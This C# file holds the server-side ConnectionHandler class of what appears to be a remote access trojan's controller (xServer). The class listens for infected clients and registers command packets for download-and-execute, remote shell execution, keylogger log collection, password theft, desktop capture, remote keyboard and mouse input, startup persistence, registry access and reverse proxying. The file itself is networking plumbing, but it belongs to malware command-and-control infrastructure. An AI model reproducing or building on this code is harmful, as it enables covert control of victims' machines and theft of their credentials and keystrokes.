using System;
using System.Collections.Generic;
using xServer.Core.Packets;

namespace xServer.Core.Networking
{
    public class ConnectionHandler
    {
        /// <summary>
        /// The Server which this class is handling.
        /// </summary>
        private readonly Server _server;

        /// <summary>
        /// A hashset containing all unique client IDs that have ever connected to the server.
        /// </summary>
        private HashSet<string> AllTimeConnectedClients { get; set; }

        /// <summary>
        /// The number of all unique clients which have ever connected to the server.
        /// </summary>
        public int AllTimeConnectedClientsCount { get { return AllTimeConnectedClients.Count; } }

        /// <summary>
        /// The amount of currently connected and authenticated clients.
        /// </summary>
        public int ConnectedAndAuthenticatedClients { get; set; }

        /// <summary>
        /// The listening state of the server. True if listening, else False.
        /// </summary>
        public bool Listening { get { return _server.Listening; } }

        /// <summary>
        /// The total amount of received bytes.
        /// </summary>
        public long BytesReceived { get { return _server.BytesReceived; } }

        /// <summary>
        /// The total amount of sent bytes.
        /// </summary>  
        public long BytesSent { get { return _server.BytesSent; } }

        /// <summary>
        /// Occurs when the state of the server changes.
        /// </summary>
        public event ServerStateEventHandler ServerState;

        /// <summary>
        /// Represents a method that will handle a change in the server's state.
        /// </summary>
        /// <param name="listening">The new listening state of the server.</param>
        public delegate void ServerStateEventHandler(ushort port, bool listening);

        /// <summary>
        /// Fires an event that informs subscribers that the server has changed it's state.
        /// </summary>
        /// <param name="server">The server which changed it's state.</param>
        /// <param name="listening">The new listening state of the server.</param>
        private void OnServerState(Server server, bool listening)
        {
            if (ServerState != null)
            {
                ServerState(server.Port, listening);
            }
        }

        /// <summary>
        /// Occurs when a client connected.
        /// </summary>
        public event ClientConnectedEventHandler ClientConnected;

        /// <summary>
        /// Represents the method that will handle the connected client.
        /// </summary>
        /// <param name="client">The connected client.</param>
        public delegate void ClientConnectedEventHandler(Client client);

        /// <summary>
        /// Fires an event that informs subscribers that the client is connected.
        /// </summary>
        /// <param name="client">The connected client.</param>
        private void OnClientConnected(Client client)
        {
            if (ClientConnected != null)
            {
                ClientConnected(client);
            }
        }

        /// <summary>
        /// Occurs when a client disconnected.
        /// </summary>
        public event ClientDisconnectedEventHandler ClientDisconnected;

        /// <summary>
        /// Represents the method that will handle the disconnected client.
        /// </summary>
        /// <param name="client">The disconnected client.</param>
        public delegate void ClientDisconnectedEventHandler(Client client);

        /// <summary>
        /// Fires an event that informs subscribers that the client is disconnected.
        /// </summary>
        /// <param name="client">The disconnected client.</param>
        private void OnClientDisconnected(Client client)
        {
            if (ClientDisconnected != null)
            {
                ClientDisconnected(client);
            }
        }

        /// <summary>
        /// Constructor, initializes required objects and subscribes to events of the server.
        /// </summary>
        public ConnectionHandler()
        {
            AllTimeConnectedClients = new HashSet<string>();

            _server = new Server();

            _server.AddTypesToSerializer(new Type[]
            {
                typeof (Packets.ServerPackets.GetAuthentication),
                typeof (Packets.ServerPackets.DoClientDisconnect),
                typeof (Packets.ServerPackets.DoClientReconnect),
                typeof (Packets.ServerPackets.DoClientUninstall),
                typeof (Packets.ServerPackets.DoDownloadAndExecute),
                typeof (Packets.ServerPackets.DoUploadAndExecute),
                typeof (Packets.ServerPackets.GetDesktop),
                typeof (Packets.ServerPackets.GetProcesses),
                typeof (Packets.ServerPackets.DoProcessKill),
                typeof (Packets.ServerPackets.DoProcessStart),
                typeof (Packets.ServerPackets.GetDrives),
                typeof (Packets.ServerPackets.GetDirectory),
                typeof (Packets.ServerPackets.DoDownloadFile),
                typeof (Packets.ServerPackets.DoMouseEvent),
                typeof (Packets.ServerPackets.DoKeyboardEvent),
                typeof (Packets.ServerPackets.GetSystemInfo),
                typeof (Packets.ServerPackets.DoVisitWebsite),
                typeof (Packets.ServerPackets.DoShowMessageBox),
                typeof (Packets.ServerPackets.DoClientUpdate),
                typeof (Packets.ServerPackets.GetMonitors),
                typeof (Packets.ServerPackets.DoShellExecute),
                typeof (Packets.ServerPackets.DoPathRename),
                typeof (Packets.ServerPackets.DoPathDelete),
                typeof (Packets.ServerPackets.DoShutdownAction),
                typeof (Packets.ServerPackets.GetStartupItems),
                typeof (Packets.ServerPackets.DoStartupItemAdd),
                typeof (Packets.ServerPackets.DoStartupItemRemove),
                typeof (Packets.ServerPackets.DoDownloadFileCancel),
                typeof (Packets.ServerPackets.GetKeyloggerLogs),
                typeof (Packets.ServerPackets.DoUploadFile),
                typeof (Packets.ServerPackets.GetPasswords),
                typeof (Packets.ServerPackets.DoLoadRegistryKey),
                typeof (Packets.ServerPackets.SetAuthenticationSuccess),
                typeof (Packets.ClientPackets.GetAuthenticationResponse),
                typeof (Packets.ClientPackets.SetStatus),
                typeof (Packets.ClientPackets.SetStatusFileManager),
                typeof (Packets.ClientPackets.SetUserStatus),
                typeof (Packets.ClientPackets.GetDesktopResponse),
                typeof (Packets.ClientPackets.GetProcessesResponse),
                typeof (Packets.ClientPackets.GetDrivesResponse),
                typeof (Packets.ClientPackets.GetDirectoryResponse),
                typeof (Packets.ClientPackets.DoDownloadFileResponse),
                typeof (Packets.ClientPackets.GetSystemInfoResponse),
                typeof (Packets.ClientPackets.GetMonitorsResponse),
                typeof (Packets.ClientPackets.DoShellExecuteResponse),
                typeof (Packets.ClientPackets.GetStartupItemsResponse),
                typeof (Packets.ClientPackets.GetKeyloggerLogsResponse),
                typeof (Packets.ClientPackets.GetPasswordsResponse),
                typeof (Packets.ClientPackets.GetRegistryKeysResponse),
                typeof (ReverseProxy.Packets.ReverseProxyConnect),
                typeof (ReverseProxy.Packets.ReverseProxyConnectResponse),
                typeof (ReverseProxy.Packets.ReverseProxyData),
                typeof (ReverseProxy.Packets.ReverseProxyDisconnect)
            });

            _server.ServerState += OnServerState;
            _server.ClientState += ClientState;
            _server.ClientRead += ClientRead;
        }

        /// <summary>
        /// Counts the unique client ID to all time connected clients.
        /// </summary>
        /// <remarks>
        /// If the client already connected before, the client ID won't be added.
        /// </remarks>
        /// <param name="id">The ID to add.</param>
        public void CountAllTimeConnectedClientById(string id)
        {
            AllTimeConnectedClients.Add(id);
        }

        /// <summary>
        /// Begins listening for clients.
        /// </summary>
        /// <param name="port">Port to listen for clients on.</param>
        public void Listen(ushort port)
        {
            if (!_server.Listening) _server.Listen(port);
        }

        /// <summary>
        /// Disconnect the server from all of the clients and discontinue
        /// listening (placing the server in an "off" state).
        /// </summary>
        public void Disconnect()
        {
            if (_server.Listening) _server.Disconnect();
        }

        /// <summary>
        /// Decides if the client connected or disconnected.
        /// </summary>
        /// <param name="server">The server the client is connected to.</param>
        /// <param name="client">The client which changed its state.</param>
        /// <param name="connected">True if the client connected, false if disconnected.</param>
        private void ClientState(Server server, Client client, bool connected)
        {
            switch (connected)
            {
                case true:
                    OnClientConnected(client);
                    break;
                case false:
                    OnClientDisconnected(client);
                    break;
            }
        }

        /// <summary>
        /// Forwards received packets from the client to the PacketHandler.
        /// </summary>
        /// <param name="server">The server the client is connected to.</param>
        /// <param name="client">The client which has received the packet.</param>
        /// <param name="packet">The received packet.</param>
        private void ClientRead(Server server, Client client, IPacket packet)
        {
            PacketHandler.HandlePacket(client, packet);
        }
    }
}
